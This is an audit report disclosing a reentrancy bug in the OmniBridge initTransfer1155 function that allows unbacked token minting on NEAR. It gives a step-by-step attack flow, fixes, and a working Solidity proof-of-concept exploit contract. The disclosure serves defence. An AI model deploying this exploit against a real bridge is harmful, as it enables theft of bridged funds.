Audit Report

## Title
ERC1155 `safeTransferFrom` Callback Enables Reentrancy in `initTransfer1155`, Allowing Unauthorized Token Minting on NEAR - (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

## Summary

`initTransfer1155` increments the storage variable `currentOriginNonce` before making an external `safeTransferFrom` call to an attacker-controlled ERC1155 token, then reads `currentOriginNonce` again after the call when emitting `InitTransfer`. A malicious ERC1155 contract can reenter `initTransfer1155` during the callback, causing two `InitTransfer` events to be emitted with the same nonce — neither backed by locked tokens. The NEAR side processes the first event and mints bridged tokens with no EVM collateral held.

## Finding Description

In `initTransfer1155` (L447–490):

```
L448:  currentOriginNonce += 1;          // storage write: nonce = N
...
L458:  IERC1155(tokenAddress).safeTransferFrom(  // external call to attacker token
           msg.sender, address(this), tokenId, amount, ""
       );
...
L471:  initTransferExtension(..., currentOriginNonce, ...)  // reads storage AFTER external call
L483:  emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...)  // reads storage AFTER external call
```

`currentOriginNonce` is a storage variable, not a local cache. After the external call returns, the value read at L471 and L483 reflects any mutations made during reentrancy.

**Attack flow:**

1. Attacker deploys `MaliciousERC1155` whose `safeTransferFrom` reenters the bridge instead of transferring tokens.
2. Attacker calls `logMetadata1155(malicious, tokenId)` — permissionless (L234–270, no access control).
3. Attacker calls `initTransfer1155(malicious, tokenId, 100, ...)`:
   - Outer call: `currentOriginNonce` → N (L448).
   - Outer call: `safeTransferFrom` invoked on malicious token (L458).
   - Malicious `safeTransferFrom` reenters `initTransfer1155`:
     - Inner call: `currentOriginNonce` → N+1 (L448).
     - Inner call: `safeTransferFrom` (depth 2) does nothing, returns.
     - Inner call: emits `InitTransfer(nonce=N+1)` — **no tokens locked** (L480–489).
   - Returns to outer `safeTransferFrom`, which also does nothing and returns.
   - Outer call: reads `currentOriginNonce = N+1` (mutated by inner call).
   - Outer call: emits `InitTransfer(nonce=N+1)` — **same nonce, still no tokens locked** (L480–489).
4. NEAR processes the first `InitTransfer(N+1)` (emitted during reentrancy) → mints bridged tokens to attacker.
5. NEAR rejects the second `InitTransfer(N+1)` as a duplicate nonce.

**Why existing checks fail:**

- `onERC1155Received` (L522–535) checks `operator != address(this)`. Since the bridge calls `safeTransferFrom`, the operator is `address(bridge)`, so the check passes. However, this check is entirely irrelevant: the malicious `safeTransferFrom` implementation never calls `onERC1155Received` — it reenters the bridge directly. The bridge cannot enforce what the malicious token does inside its own `safeTransferFrom`.
- There is no `nonReentrant` modifier on `initTransfer1155`.
- `logMetadata1155` has no access control, so any attacker can register an arbitrary ERC1155 address.

## Impact Explanation

The NEAR bridge treats any `InitTransfer` event emitted by the registered EVM contract as proof that tokens are held on EVM. A fraudulent event with a valid nonce causes NEAR to mint bridged tokens with zero EVM collateral locked. This is unauthorized minting of bridged funds — a critical impact matching the allowed scope: *"unauthorized minting… of bridged funds across NEAR… or EVM… flows."*

## Likelihood Explanation

- `logMetadata1155` is permissionless; no whitelist or admin approval is required to register a malicious ERC1155 token.
- No reentrancy guard exists on `initTransfer1155`.
- The attacker needs only to deploy one malicious contract and call two public functions (`logMetadata1155`, `initTransfer1155`).
- The attack is repeatable: each execution mints additional tokens on NEAR with no collateral.
- No victim interaction, no privileged role, no external oracle, and no off-chain coordination is required.

## Recommendation

1. **Cache the nonce in a local variable** before the external call and use only the cached value thereafter:
   ```solidity
   uint64 nonce = ++currentOriginNonce;
   // ... safeTransferFrom ...
   initTransferExtension(..., nonce, ...);
   emit BridgeTypes.InitTransfer(..., nonce, ...);
   ```
2. **Add `nonReentrant`** (OpenZeppelin `ReentrancyGuardUpgradeable`) to `initTransfer1155` and `initTransfer`.
3. **Verify token receipt** by checking the bridge's ERC1155 balance of `tokenId` before and after `safeTransferFrom` and reverting if the delta is less than `amount`.

## Proof of Concept

Deploy the following contract against a local fork of the bridge:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IOmniBridge {
    function initTransfer1155(address, uint256, uint128, uint128, uint128, string calldata, string calldata) external payable;
    function logMetadata1155(address, uint256) external;
}

contract MaliciousERC1155 {
    IOmniBridge bridge;
    uint256 depth;
    uint256 constant TOKEN_ID = 1;

    constructor(address _bridge) { bridge = IOmniBridge(_bridge); }

    function safeTransferFrom(address, address, uint256, uint256, bytes calldata) external {
        if (++depth == 1) {
            bridge.initTransfer1155(address(this), TOKEN_ID, 100, 0, 0, "attacker.near", "");
        }
        depth--;
    }

    function balanceOf(address, uint256) external pure returns (uint256) { return 1000; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }

    function attack() external {
        bridge.logMetadata1155(address(this), TOKEN_ID);
        bridge.initTransfer1155(address(this), TOKEN_ID, 100, 0, 0, "attacker.near", "");
    }
}
```

**Verification:** After `attack()`, assert that two `InitTransfer` events were emitted with identical nonce values, and that the bridge holds zero ERC1155 balance for `TOKEN_ID`. Confirm the NEAR relayer would process the first event and mint tokens to `attacker.near`.
